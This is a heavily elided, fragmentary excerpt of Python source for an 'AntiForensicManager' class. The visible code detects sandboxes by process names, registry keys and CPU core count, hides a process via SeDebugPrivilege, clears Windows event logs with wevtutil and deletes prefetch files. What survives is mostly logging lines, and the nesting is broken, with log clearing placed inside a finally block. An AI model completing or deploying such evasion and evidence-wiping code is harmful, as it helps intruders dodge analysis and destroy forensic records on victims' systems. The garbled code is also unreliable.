...
class AntiForensicManager:
        ...
        try:
            ...
            for proc in psutil.process_iter(["name"]):
                try:
                    ...
                    logger.warning(
                        f"Error checking process {getattr(proc, 'pid', 'N/A')}: {e}"
            ...
            for key_path in self.sandbox_indicators["registry_keys"]:
                ...
                try:
                    ...
                    key_handle = win32api.RegOpenKey(
                        win32con.HKEY_LOCAL_MACHINE, key_path, 0, win32con.KEY_READ
                    )
                    if key_handle:
    ...
    def _check_cpu(self) -> bool:
        ...
        try:
            ...
            if cpu_count is not None and cpu_count < threshold_cores:
                logger.debug(
                    f"Low CPU core count detected: {cpu_count} (Threshold: < {threshold_cores})"
                )
                return True
    ...
    def hide_process(self, pid: Optional[int] = None) -> bool:
        ...
        try:
            ...
            logger.error(
                f"Security error attempting to enable SeDebugPrivilege for PID {target_pid}: {e}",
                exc_info=True,
            )
            return False
        except OSError as e:
            ...
            logger.error(
                f"OS error attempting to enable SeDebugPrivilege for PID {target_pid}: {e}",
                exc_info=True,
            )
            return False
        except Exception as e:
            ...
            logger.error(
                f"Unexpected error attempting to enable SeDebugPrivilege for PID {target_pid}: {e}",
                exc_info=True,
            )
            return False
        finally:
            ...
            if "subprocess" in locals():
                for log_name in logs_to_clear:
                    try:
                        ...
                        logger.error(
                            f"Error running wevtutil to clear '{log_name}': {e}", exc_info=True
                        )
                        failed_any_log = True
                ...
                try:
                    for filename in os.listdir(prefetch_dir):
                        ...
                        try:
                            ...
                            logger.error(
                                f"Unexpected error removing prefetch file '{filename}': {e}",
                                exc_info=True,
                            )
                            failed_any_prefetch = True
                    ...
                    logger.error(
                        f"Error accessing prefetch directory '{prefetch_dir}': {e}", exc_info=True
                    )
                    overall_success = False
            else:
                logger.warning(
                    f"Prefetch directory not found or not accessible at '{prefetch_dir}'. Skipping."
                )
        else:
